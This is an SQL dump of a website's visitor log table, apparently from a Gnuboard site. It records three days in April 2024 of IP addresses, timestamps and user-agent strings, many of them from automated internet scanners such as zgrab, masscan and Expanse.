INSERT INTO `g5_visit` VALUES ('1425', '118.123.105.93', '2024-04-14', '01:14:09', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1426', '154.212.141.163', '2024-04-14', '01:31:00', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1427', '118.26.38.106', '2024-04-14', '01:43:40', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1428', '45.79.163.53', '2024-04-14', '02:06:54', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1429', '172.105.128.11', '2024-04-14', '02:19:49', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1430', '198.74.56.46', '2024-04-14', '02:24:42', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1431', '45.79.181.104', '2024-04-14', '02:33:30', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1432', '45.79.168.172', '2024-04-14', '02:45:55', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1433', '172.104.11.4', '2024-04-14', '02:46:06', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1434', '45.33.80.243', '2024-04-14', '02:46:35', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1435', '172.105.128.12', '2024-04-14', '02:48:37', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1436', '162.216.150.66', '2024-04-14', '03:04:31', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1437', '45.79.172.21', '2024-04-14', '03:10:53', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1438', '185.224.128.43', '2024-04-14', '04:03:49', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1439', '138.197.130.224', '2024-04-14', '04:19:16', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1440', '146.19.24.28', '2024-04-14', '04:32:49', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1441', '172.104.210.105', '2024-04-14', '04:35:13', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1442', '172.105.128.13', '2024-04-14', '04:53:13', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1443', '178.128.27.121', '2024-04-14', '05:06:18', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1444', '46.174.191.30', '2024-04-14', '05:06:29', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1445', '167.94.146.60', '2024-04-14', '05:08:33', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1446', '69.164.217.245', '2024-04-14', '05:09:23', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1447', '66.175.213.4', '2024-04-14', '05:22:53', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1448', '45.79.181.223', '2024-04-14', '05:33:27', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1449', '45.88.90.72', '2024-04-14', '05:46:33', '', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30', '', '', '');
INSERT INTO `g5_visit` VALUES ('1450', '198.199.96.92', '2024-04-14', '06:17:54', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1451', '192.155.88.231', '2024-04-14', '06:29:04', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1452', '192.155.90.220', '2024-04-14', '06:45:41', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1453', '168.76.20.229', '2024-04-14', '06:49:18', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1454', '194.120.230.95', '2024-04-14', '07:29:22', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1455', '101.128.67.200', '2024-04-14', '07:56:57', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1456', '194.120.230.94', '2024-04-14', '08:19:33', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1457', '172.104.11.34', '2024-04-14', '08:47:26', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1458', '45.79.128.205', '2024-04-14', '09:07:21', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1459', '172.104.11.46', '2024-04-14', '09:10:02', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1460', '64.62.197.59', '2024-04-14', '09:28:30', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1461', '185.150.26.240', '2024-04-14', '09:44:59', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1462', '185.150.26.246', '2024-04-14', '10:31:57', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1463', '34.78.68.58', '2024-04-14', '11:25:39', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1464', '35.203.210.28', '2024-04-14', '11:28:01', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1465', '205.210.31.18', '2024-04-14', '12:56:32', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1466', '45.79.181.94', '2024-04-14', '12:57:01', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1467', '198.235.24.137', '2024-04-14', '13:04:24', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1468', '45.79.181.251', '2024-04-14', '14:32:45', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1469', '45.128.232.27', '2024-04-14', '15:33:44', 'http://158.180.78.143:80/left.html', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1470', '205.210.31.201', '2024-04-14', '15:50:11', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1471', '69.164.217.74', '2024-04-14', '16:14:20', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1472', '185.191.126.213', '2024-04-14', '17:09:15', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1473', '64.227.160.117', '2024-04-14', '17:50:40', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1474', '130.211.54.158', '2024-04-14', '19:07:09', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1475', '167.94.145.60', '2024-04-14', '19:12:56', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1476', '46.174.191.28', '2024-04-14', '19:58:04', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1477', '46.19.138.210', '2024-04-14', '20:38:55', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3', '', '', '');
INSERT INTO `g5_visit` VALUES ('1478', '200.53.19.209', '2024-04-15', '00:07:46', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('1479', '194.120.230.94', '2024-04-15', '00:46:15', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1480', '185.224.128.43', '2024-04-15', '01:02:15', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1481', '60.190.248.12', '2024-04-15', '01:25:40', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1482', '122.224.129.234', '2024-04-15', '01:26:01', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1483', '45.79.163.53', '2024-04-15', '01:29:32', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1484', '172.104.11.4', '2024-04-15', '01:37:46', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1485', '185.191.126.213', '2024-04-15', '01:49:26', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1486', '146.19.24.28', '2024-04-15', '01:49:50', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1487', '194.120.230.95', '2024-04-15', '02:08:03', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1488', '45.79.181.251', '2024-04-15', '02:43:26', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1489', '45.79.168.172', '2024-04-15', '03:00:05', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1490', '192.155.90.220', '2024-04-15', '03:00:41', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1491', '185.242.226.10', '2024-04-15', '04:09:21', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1492', '69.164.217.245', '2024-04-15', '04:26:58', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1493', '198.74.56.46', '2024-04-15', '04:38:22', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1494', '66.175.213.4', '2024-04-15', '04:58:06', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1495', '172.104.11.51', '2024-04-15', '05:00:24', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1496', '172.105.128.12', '2024-04-15', '05:45:56', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1497', '198.235.24.13', '2024-04-15', '06:16:19', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1498', '185.150.26.240', '2024-04-15', '06:49:48', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1499', '45.79.181.94', '2024-04-15', '07:24:24', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1500', '167.94.138.49', '2024-04-15', '07:55:35', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1501', '205.210.31.33', '2024-04-15', '08:08:33', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1502', '35.203.211.72', '2024-04-15', '08:09:18', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1503', '172.104.11.46', '2024-04-15', '08:28:02', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1504', '172.104.11.34', '2024-04-15', '08:30:19', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1505', '45.79.128.205', '2024-04-15', '08:42:41', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1506', '192.155.90.118', '2024-04-15', '08:43:00', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1507', '45.79.172.21', '2024-04-15', '08:44:43', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1508', '45.79.181.104', '2024-04-15', '08:53:07', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1509', '172.105.128.11', '2024-04-15', '08:53:22', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1510', '172.105.128.13', '2024-04-15', '08:59:47', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1511', '185.150.26.246', '2024-04-15', '09:20:22', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1512', '184.105.139.68', '2024-04-15', '09:24:32', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1513', '69.164.217.74', '2024-04-15', '10:14:02', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1514', '192.155.88.231', '2024-04-15', '11:52:41', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1515', '142.93.31.231', '2024-04-15', '12:43:53', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1516', '107.151.243.170', '2024-04-15', '13:01:59', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1517', '172.206.117.15', '2024-04-15', '13:08:48', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1518', '35.203.210.97', '2024-04-15', '13:27:53', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1519', '165.154.172.108', '2024-04-15', '14:16:53', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1520', '167.71.133.68', '2024-04-15', '14:53:35', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1521', '193.106.29.125', '2024-04-15', '14:55:15', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1522', '152.32.247.54', '2024-04-15', '15:02:46', '', 'curl/7.29.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1523', '118.194.250.95', '2024-04-15', '15:22:40', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/579.54 (KHTML, like Gecko) Chrome/56.0.1390 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1524', '105.112.93.194', '2024-04-15', '15:25:08', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1525', '107.170.243.28', '2024-04-15', '15:25:18', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1526', '46.174.191.28', '2024-04-15', '15:31:23', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1527', '199.204.96.242', '2024-04-15', '16:03:14', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1528', '205.210.31.47', '2024-04-15', '16:30:13', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1529', '45.33.80.243', '2024-04-15', '16:42:30', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1530', '220.167.232.198', '2024-04-15', '17:37:27', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1531', '171.36.6.26', '2024-04-15', '17:38:18', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1532', '71.6.232.28', '2024-04-15', '21:01:53', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1533', '210.16.65.134', '2024-04-15', '22:53:52', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0.3 Safari/E7FBAF', '', '', '');
INSERT INTO `g5_visit` VALUES ('1534', '35.240.121.17', '2024-04-15', '23:11:15', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1535', '178.128.162.110', '2024-04-15', '23:54:31', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1536', '172.105.128.13', '2024-04-16', '00:01:49', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1537', '185.191.126.213', '2024-04-16', '00:01:49', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1538', '45.79.163.53', '2024-04-16', '00:19:07', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1539', '146.19.24.28', '2024-04-16', '00:27:03', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1540', '66.175.213.4', '2024-04-16', '00:44:29', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1541', '185.150.26.246', '2024-04-16', '01:01:59', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1542', '185.224.128.43', '2024-04-16', '01:52:40', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1543', '172.104.210.105', '2024-04-16', '02:18:40', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1544', '103.203.56.1', '2024-04-16', '03:13:09', '', 'HTTP Banner Detection (https://security.ipip.net)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1545', '104.152.52.97', '2024-04-16', '03:57:28', '', 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1546', '35.203.210.210', '2024-04-16', '04:33:26', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1547', '172.105.128.11', '2024-04-16', '04:56:30', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1548', '162.142.125.222', '2024-04-16', '04:59:04', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1549', '172.104.11.46', '2024-04-16', '05:27:51', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1550', '36.156.22.4', '2024-04-16', '05:38:58', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1551', '45.79.181.104', '2024-04-16', '05:59:27', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1552', '45.79.181.94', '2024-04-16', '06:19:56', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1553', '192.155.88.231', '2024-04-16', '06:27:35', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1554', '194.120.230.95', '2024-04-16', '06:37:06', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1555', '45.79.168.172', '2024-04-16', '06:49:25', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1556', '45.33.80.243', '2024-04-16', '06:49:33', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1557', '192.155.90.118', '2024-04-16', '06:50:02', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1558', '45.79.128.205', '2024-04-16', '06:50:41', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1559', '172.104.11.4', '2024-04-16', '06:52:01', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1560', '45.79.181.223', '2024-04-16', '08:19:32', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1561', '198.74.56.46', '2024-04-16', '08:23:31', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1562', '45.79.181.179', '2024-04-16', '08:24:33', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1563', '192.155.90.220', '2024-04-16', '08:24:49', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
